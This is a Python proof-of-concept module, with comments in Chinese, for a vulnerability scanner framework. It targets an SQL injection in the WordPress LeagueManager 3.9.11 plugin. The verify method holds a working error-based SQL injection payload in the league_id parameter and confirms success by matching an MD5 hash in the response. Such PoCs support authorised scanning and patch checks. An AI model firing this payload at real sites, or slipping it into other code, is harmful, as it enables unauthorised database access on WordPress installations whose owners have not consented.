# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0028' # 平台漏洞编号，留空
    name = 'WordPress LeagueManager 3.9.11 Plugin SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-02'  # 漏洞公布时间
    desc = '''
        WordPress LeagueManager 3.9.11 Plugin SQL注入漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37182/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin LeagueManager 3.9.11'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c4d811eb-0b92-4087-93d0-68f5df9e675c'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/?season=1&league_id=1%27%20AND%20(SELECT%203804%20FROM(SELECT%20COUNT(*),CONCAT(0x7178766b71,md5(12345),0x7170707171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20%27zZcz%27=%27zZcz&match_day=1&team_id=1" 
            verify_url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _ = hh.http(verify_url)
                       
            if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()